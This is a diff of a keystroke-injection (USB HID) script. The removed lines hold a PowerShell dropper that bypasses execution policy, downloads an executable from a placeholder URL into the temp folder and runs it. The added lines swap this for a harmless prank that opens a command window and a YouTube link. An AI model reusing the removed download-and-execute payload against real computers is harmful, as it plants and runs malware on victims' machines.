@@ -1,10 +1,13 @@
-DELAY 1000
-GUI r
-DELAY 1000
-STRING powershell -NoP -NonI -Exec Bypass
-ENTER
-DELAY 1000
-STRING $Http = new-object -com "WinHttp.WinHttpRequest.5.1";$Http.open("GET","PAYLOAD_URL", $false);$Http.send();[io.file]::WriteAllBytes("$env:temp\p.exe",$Http.responseBody);Start-Process "$env:temp\p.exe"
-ENTER
-DELAY 5000
-ALT F4
+win+r
+\sleep 0.5
+cmd
+enter
+\sleep 0.5
+color a
+enter
+@echo off
+enter
+cls
+enter
+start https://www.youtube.com/watch?v=mCdA4bJAGGk && exit
+enter
